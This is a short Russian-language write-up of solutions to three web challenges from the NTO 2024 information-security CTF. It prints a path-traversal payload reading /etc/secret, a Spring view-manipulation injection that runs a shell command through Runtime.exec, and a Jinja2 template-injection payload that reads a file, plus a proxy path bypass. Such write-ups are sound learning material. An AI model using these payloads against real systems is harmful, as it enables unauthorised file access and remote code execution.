# Решения заданий НТО ИБ 2024 1337Rpwn4
# CTF

### WEB 1

Заходим на таск и видим календарь, один из дней на котором окрашен в типичную HTML-гиперссылку. Нажимаем. Идёт редирект на: `/download?file_type=file1.txt`

Пробуем LFI:
```
download?file_type=../../../../../../../../../etc/secret
```

Флаг: `nto{P6t9_T77v6RsA1}`

### WEB 2

Заливаем `jar`-файл в `jd-gui` и видим следующий, казалось бы, пустой метод:

```
  @GetMapping({"/doc/{document}"})
  public void getDocument(@PathVariable String document) {
    System.out.println("This function is not ready yet");
  }
```

Пробуем `Spring View Manipulation Vulnerability`:

```
/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::..x
```

Флаг: `nto{abobovichasdfas}`

### WEB 3

На эндпоинте `/flag` видим 403 ошибку. Заходим в исходники и находим `haproxy`. Пробуем дефолтные байпассы, сработал, например, `//flag`.

Далее фильтруемая `SSTI` в `Jinja2`. Гуглим хактриксы и вводим:

```
//flag?name={{(request|attr(request.args.c))._load_form_data.__globals__.__builtins__.open(%22flag.txt%22).read()}}&c=__class__
```

Флаг: `nto{Ht1P_sM088Lin6_88Ti}`
